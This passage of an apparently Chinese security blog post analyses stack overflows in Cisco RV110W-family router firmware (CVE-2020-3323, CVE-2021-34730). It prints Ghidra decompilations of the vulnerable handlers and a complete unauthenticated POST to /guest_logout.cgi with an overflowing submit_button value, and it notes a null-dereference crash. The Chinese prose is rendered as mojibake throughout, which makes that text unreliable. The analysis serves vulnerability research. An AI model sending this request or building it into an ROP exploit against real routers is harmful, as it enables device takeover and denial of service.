class="string">&quot;http_user%d&quot;</span>,param_1);</span><br><span class="line">  iVar1 = <span class="built_in">strncmp</span>(param_3,<span class="string">&quot;enc=&quot;</span>,<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(param_3,<span class="string">&quot;enc=%s&quot;</span>,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="type">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    md5_encode(param_3,&amp;local_11c);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(param_4,(<span class="type">char</span> *)&amp;local_11c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">sprintf</span>(acStack234,<span class="string">&quot;%s,enc=%s,%s&quot;</span>,param_6,param_5,guest_name);</span><br><span class="line">    nvram_set(&amp;local_128,acStack234);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (uint)(iVar1 != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°ç¬¬ 53 è¡Œä½¿ç”¨ sprintf å‡½æ•°å°†å¤–éƒ¨ä¼ å…¥çš„å‚æ•°æ‹·è´åˆ°æ ˆå˜é‡ï¼Œå…¶ä¸­æœ€åä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬å…³æ³¨çš„ guest_name å˜é‡ã€‚(ç¬¬äº”å’Œç¬¬å…­ä¸ªå‚æ•°ä¹Ÿå¯ä»¥å¯¼è‡´æº¢å‡ºï¼Œä¸è¿‡é€‰æ‹©æœ€åä¸€ä¸ªå‚æ•°å¯ä»¥å‡å°‘å¹²æ‰°)</p>
<p>å¦‚æœä¼ å…¥ä¸€ä¸ªè¶…é•¿çš„å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥è§¦å‘æ ˆæº¢å‡ºï¼Œç»“åˆ ROP ç­‰æŠ€æœ¯å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚(æ”»å‡»åˆ†æè§ä¸‹æ–‡)</p>
<p><strong>å¦å¤–ï¼Œåœ¨å‡½æ•° validate_guest_vlan ä¸­ä¹Ÿå­˜åœ¨ç±»ä¼¼çš„é—®é¢˜ï¼Œä¸è¿‡è¿™äº›æ¼æ´éƒ½å±äºåå°æ¼æ´ï¼Œå®é™…æ”»å‡»ä¸­ä»·å€¼ä¸æ˜¯å¾ˆå¤§ã€‚</strong></p>
<h2 id="CVE-2020-3323"><a href="#CVE-2020-3323" class="headerlink" title="CVE-2020-3323"></a>CVE-2020-3323</h2><h3 id="åŸºæœ¬ä¿¡æ¯-2"><a href="#åŸºæœ¬ä¿¡æ¯-2" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>å®˜æ–¹å‘å¸ƒä¿¡æ¯ï¼š <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX" >https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-rce-m4FEEGWX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ¼æ´è¯„åˆ†ï¼š9.8(<strong>Critical</strong>)</p>
<p>æ¼æ´æè¿°ï¼šæ­¤æ¼æ´ä½äº web ç®¡ç†ç•Œé¢ä¸­ï¼Œå½±å“ Cisco RV110Wï¼ŒRV130 ä»¥åŠ RV215W ç­‰è®¾å¤‡ã€‚æœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šæ ¼å¼çš„ HTTP è¯·æ±‚ï¼Œè§¦å‘æ­¤æ¼æ´ï¼Œä»è€Œå¯¼è‡´æœªæˆæƒçš„ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<h3 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ­¤æ¼æ´åœ¨ 1.2.2.8 ç‰ˆæœ¬ä¸­è¿›è¡Œäº†ä¿®å¤ã€‚</p>
<p>2020 å¹´å¼ºç½‘æ¯çš„ IoT é¡¹ç›®æ”»å‡»ç›®æ ‡ä¹‹ä¸€å°±æ˜¯ RV110Wï¼Œç°åœºåº”è¯¥æœ‰é˜Ÿä¼åˆ©ç”¨äº†è¿™ä¸ª nDay å®Œæˆäº†æ”»å‡»ã€‚</p>
<p>æ­¤æ¼æ´ä½äºå‡½æ•° guest_logout_cgi ä¸­ï¼ŒGhidra åç¼–è¯‘ç»“æœå¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">undefined4 <span class="title function_">guest_logout_cgi</span><span class="params">(undefined4 param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> cVar1;</span><br><span class="line">  <span class="type">bool</span> bVar2;</span><br><span class="line">  <span class="type">int</span> cmac2;</span><br><span class="line">  <span class="type">char</span> *cmac;</span><br><span class="line">  <span class="type">size_t</span> cmac_len;</span><br><span class="line">  FILE *__stream;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">char</span> *cmac_end;</span><br><span class="line">  <span class="type">char</span> *maybe_vuln;</span><br><span class="line">  <span class="type">char</span> *local_c0;</span><br><span class="line">  undefined1 *local_bc;</span><br><span class="line">  <span class="type">char</span> *local_b8;</span><br><span class="line">  <span class="type">char</span> *local_b4;</span><br><span class="line">  undefined4 local_b0;</span><br><span class="line">  <span class="type">char</span> acStack172 [<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> acStack108 [<span class="number">68</span>];</span><br><span class="line">  </span><br><span class="line">  cmac2 = get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac &lt; cmac_end) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *cmac_end;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp; (cVar1 != <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp; (cVar1 != <span class="string">&#x27; &#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *cmac_end = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      cmac_end = cmac_end + <span class="number">-1</span>;</span><br><span class="line">      cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac &lt; cmac_end);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cmac&quot;</span>);</span><br><span class="line">  cmac2 = get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(cmac_end);</span><br><span class="line">  maybe_vuln = (<span class="type">char</span> *)(cmac2 + cmac_len + <span class="number">-1</span>);</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac_end &lt; maybe_vuln) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      cVar1 = *maybe_vuln;</span><br><span class="line">      <span class="keyword">if</span> (((cVar1 != <span class="string">&#x27;\n&#x27;</span>) &amp;&amp; (cVar1 != <span class="string">&#x27;\r&#x27;</span>)) &amp;&amp; (cVar1 != <span class="string">&#x27; &#x27;</span>)) <span class="keyword">break</span>;</span><br><span class="line">      *maybe_vuln = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      maybe_vuln = maybe_vuln + <span class="number">-1</span>;</span><br><span class="line">      cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (cmac_end &lt; maybe_vuln);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac_end = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;cip&quot;</span>);</span><br><span class="line">  maybe_vuln = (<span class="type">char</span> *)get_cgi(<span class="string">&quot;submit_button&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (maybe_vuln == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    maybe_vuln = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cmac_end == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(acStack108,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack172,<span class="number">0</span>,<span class="number">0x40</span>);</span><br><span class="line">  __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n  mac=[%s], ip=[%s], submit_button=[%s]\n&quot;</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = VERIFY_MAC_17(cmac);</span><br><span class="line">  <span class="keyword">if</span> ((cmac2 == <span class="number">0</span>) || (cmac2 = VERIFY_IPv4(cmac_end), cmac2 == <span class="number">0</span>)) &#123;</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream == (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n%s(%d)  Drop session,VALID_FAIL, mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,</span><br><span class="line">            <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1542</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">    fclose(__stream);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __s1 = <span class="built_in">strstr</span>(maybe_vuln,<span class="string">&quot;status_guestnet.asp&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">LAB_00431d24:</span><br><span class="line">    __s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_client_mac&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (((__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac), cmac2 == <span class="number">0</span>)) &amp;&amp;</span><br><span class="line">       ((__s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;http_client_ip&quot;</span>), __s1 == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">        (cmac2 = <span class="built_in">strcmp</span>(__s1,cmac_end), cmac2 == <span class="number">0</span>)))) &#123;</span><br><span class="line">      bVar2 = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00431c68;</span><br><span class="line">    &#125;</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,</span><br><span class="line">              <span class="string">&quot;\n%s(%d)  Drop session, ip and mac invmatch,mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,</span><br><span class="line">              <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1551</span>,cmac,cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(maybe_vuln,<span class="string">&quot;%[^;];%*[^=]=%[^\n]&quot;</span>,acStack108,acStack172);</span><br><span class="line">    __stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__stream != (FILE *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;\n%s(%d),submit_button = [%s] url=[%s], session_id=[%s]\n&quot;</span>,</span><br><span class="line">              <span class="string">&quot;guest_logout_cgi&quot;</span>,<span class="number">0x1549</span>,maybe_vuln,acStack108,acStack172);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)nvram_get(<span class="string">&quot;session_key&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">    cmac2 = <span class="built_in">strcmp</span>(__s1,acStack172);</span><br><span class="line">    bVar2 = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) <span class="keyword">goto</span> LAB_00431d24;</span><br><span class="line">LAB_00431c68:</span><br><span class="line">    syslog(<span class="number">6</span>,<span class="string">&quot;The mac is %s and IP is %s of guest network user logout.&quot;</span>,cmac,cmac_end);</span><br><span class="line">    <span class="keyword">if</span> ((debug != <span class="number">0</span>) &amp;&amp; (__stream = fopen(<span class="string">&quot;/dev/console&quot;</span>,<span class="string">&quot;w&quot;</span>), __stream != (FILE *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(__stream,<span class="string">&quot;%s(): \n  mac=[%s], ip=[%s],submit_button=[%s]\n&quot;</span>,<span class="string">&quot;guest_logout_cgi&quot;</span>,cmac,</span><br><span class="line">              cmac_end,maybe_vuln);</span><br><span class="line">      fclose(__stream);</span><br><span class="line">    &#125;</span><br><span class="line">    local_c0 = <span class="string">&quot;/sbin/cron_gn&quot;</span>;</span><br><span class="line">    local_bc = &amp;DAT_00485fe4;</span><br><span class="line">    local_b0 = <span class="number">0</span>;</span><br><span class="line">    local_b8 = cmac;</span><br><span class="line">    local_b4 = cmac_end;</span><br><span class="line">    _eval(&amp;local_c0,<span class="string">&quot;&gt;/dev/console&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ((bVar2) &amp;&amp; (cmac2 = <span class="built_in">strcmp</span>(acStack108,<span class="string">&quot;status_guestnet.asp&quot;</span>), cmac2 == <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">goto</span> LAB_00431de8;</span><br><span class="line">  &#125;</span><br><span class="line">  cmac2 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;login_guest.asp&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (cmac2 != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LAB_00431de8:</span><br><span class="line">  cmac_len = <span class="built_in">strlen</span>(acStack108);</span><br><span class="line">  <span class="keyword">if</span> (cmac_len &lt; <span class="number">6</span>) &#123;</span><br><span class="line">    do_ej(maybe_vuln,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    do_ej(acStack108,param_1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 52 è¡Œä½¿ç”¨ get_cgi å‡½æ•°è·å– submit_button å­—æ®µçš„å†…å®¹ï¼Œç¬¬ 80 è¡Œä½¿ç”¨ strstr åˆ¤æ–­å…¶ä¸­æ˜¯å¦å­˜åœ¨å­—ç¬¦ä¸² â€œstatus_guestnet.aspâ€ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™æ‰§è¡Œç¬¬ 99 è¡Œçš„ä»£ç ï¼Œä½¿ç”¨ sscanf å°†æ•°æ®æ‹·è´åˆ°ä¸¤ä¸ªæ ˆå˜é‡ä¸­ã€‚</p>
<p>å¾ˆæ˜æ˜¾è¿™é‡Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œå¦‚æœç”¨æˆ·æ„é€ ä¸€ä¸ªåŒ…å« â€œstatus_guestnet.aspâ€ çš„è¶…é•¿å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è§¦å‘æ ˆæº¢å‡ºæ¼æ´ï¼Œè¿›è€Œç»“åˆ ROP ç­‰æŠ€æœ¯å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚(æ”»å‡»åˆ†æè§ä¸‹æ–‡)</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œè¿™ä¸ªå‡½æ•°å¯¹åº”çš„åå°æ¥å£æ˜¯ guest_logout.cgiï¼Œå¹¶ä¸”ä¸éœ€è¦èº«ä»½éªŒè¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„æ•°æ®åŒ…è§¦å‘æ­¤æ¼æ´ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /guest_logout.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 160</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: https://192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: iframe</span><br><span class="line">Referer: https://192.168.1.1/config_user.asp;session_id=8ba902bb5765a3645d189cccb60f2259</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">cmac=00:01:02:03:04:05&amp;cip=192.168.1.1&amp;submit_button=status_guestnet.aspaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure></div>

<p><strong>æ³¨ï¼šåœ¨ç¬¬ 38 è¡Œå°è¯•è·å– cip å­—æ®µçš„å†…å®¹ï¼Œå¦‚æœæˆ‘ä»¬ä¸æä¾›è¿™ä¸ªå­—æ®µï¼Œå°†è¿”å› 0ï¼Œç»éªŒè¯ä¼šåœ¨ strlen å‡½æ•°ä¸­å¯¼è‡´ç©ºæŒ‡é’ˆè§£å¼•ç”¨ï¼Œå¯ä»¥ä½¿ httpd æœåŠ¡å´©æºƒã€‚</strong></p>
<h2 id="CVE-2021-34730"><a href="#CVE-2021-34730" class="headerlink" title="CVE-2021-34730"></a>CVE-2021-34730</h2><h3 id="åŸºæœ¬ä¿¡æ¯-3"><a href="#åŸºæœ¬ä¿¡æ¯-3" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>å®˜æ–¹å‘å¸ƒä¿¡æ¯ï¼š <a class="link"   href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-sb-rv-overflow-htpymMB5" >Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers Remote Command Execution and Denial of Service Vulnerability<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ¼æ´è¯„åˆ†ï¼š9.8(<strong>Critical</strong>)</p>
<p>æ¼æ´æè¿°ï¼šA vulnerability in the Universal Plug-and-Play (UPnP) service of Cisco Small Business RV110W, RV130, RV130W, and RV215W Routers could allow an unauthenticated, remote attacker to execute arbitrary code or cause an affected device to restart unexpectedly, resulting in a denial of service (DoS) condition.ã€‚</p>
<h3 id="æ¼æ´åˆ†æ-3"><a href="#æ¼æ´åˆ†æ-3" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>æ­¤æ¼æ´å­˜åœ¨äºè§£æ SSDP åè®®çš„è¿‡ç¨‹ï¼Œä½äºå‡½æ•° m_search_handlerï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">m_search_handler</span><span class="params">(<span class="type">int</span> upnp_context)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">size_t</span> __n;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  <span class="type">char</span> *__s;</span><br><span class="line">  <span class="type">char</span> *pcVar3;</span><br><span class="line">  <span class="type">char</span> *maybe_vuln;</span><br><span class="line">  <span class="type">char</span> **ppcVar4;</span><br><span class="line">  <span class="type">int</span> *piVar5;</span><br><span class="line">  <span class="type">char</span> acStack168 [<span class="number">128</span>];</span><br><span class="line">  </span><br><span class="line">  ssdp_get_cur_ifp();</span><br><span class="line">  <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a0</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a0</span>),<span class="string">&quot;239.255.255.250:1900&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a4</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar1 = <span class="built_in">strcmp</span>(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a4</span>),<span class="string">&quot;\&quot;ssdp:discover\&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39ac</span>) != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        iVar1 = atoi(*(<span class="type">char</span> **)(upnp_context + <span class="number">0x39ac</span>));</span><br><span class="line">        <span class="keyword">if</span> (iVar1 &lt; <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        maybe_vuln = *(<span class="type">char</span> **)(upnp_context + <span class="number">0x39a8</span>);</span><br><span class="line">        <span class="keyword">if</span> (maybe_vuln == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;ssdp:all&quot;</span>);</span><br><span class="line">        uVar2 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">          iVar1 = <span class="built_in">strcmp</span>(maybe_vuln,<span class="string">&quot;upnp:rootdevice&quot;</span>);</span><br><span class="line">          uVar2 = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">            iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,<span class="string">&quot;uuid:&quot;</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">              piVar5 = *(<span class="type">int</span> **)(*(<span class="type">int</span> *)(upnp_context + <span class="number">0x50</span>) + <span class="number">0x2c</span>);</span><br><span class="line">              <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (piVar5 == (<span class="type">int</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ppcVar4 = *(<span class="type">char</span> ***)(piVar5[<span class="number">2</span>] + <span class="number">0xc</span>);</span><br><span class="line">                <span class="keyword">while</span> (__s = *ppcVar4, __s != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">                  __n = <span class="built_in">strlen</span>(__s);</span><br><span class="line">                  pcVar3 = ppcVar4[<span class="number">0xb</span>];</span><br><span class="line">                  ppcVar4 = ppcVar4 + <span class="number">0xc</span>;</span><br><span class="line">                  <span class="keyword">if</span> (pcVar3 != (<span class="type">char</span> *)<span class="number">0x2</span>) &#123;</span><br><span class="line">                    iVar1 = <span class="built_in">memcmp</span>(maybe_vuln,__s,__n);</span><br><span class="line">                    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">                      iVar1 = <span class="built_in">memcmp</span>(maybe_vuln + __n,<span class="string">&quot;:1&quot;</span>,<span class="number">2</span>);</span><br><span class="line">                      <span class="keyword">if</span> (iVar1 != <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> (pcVar3 == (<span class="type">char</span> *)<span class="number">0x1</span>) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">4</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">if</span> ((pcVar3 == (<span class="type">char</span> *)<span class="number">0x0</span>) || (pcVar3 == (<span class="type">char</span> *)<span class="number">0x3</span>)) &#123;</span><br><span class="line">                        <span class="built_in">strncpy</span>(acStack168,maybe_vuln,__n);</span><br><span class="line">                        uVar2 = <span class="number">5</span>;</span><br><span class="line">                        acStack168[__n] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                        <span class="keyword">goto</span> LAB_00405c94;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                piVar5 = (<span class="type">int</span> *)*piVar5;</span><br><span class="line">              &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">            &#125;</span><br><span class="line">                    <span class="comment">/* æº¢å‡º */</span></span><br><span class="line">            <span class="built_in">strcpy</span>(acStack168,maybe_vuln + <span class="number">5</span>);</span><br><span class="line">            uVar2 = <span class="number">3</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">LAB_00405c94:</span><br><span class="line">        ssdp_msearch_response(upnp_context,acStack168,uVar2);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

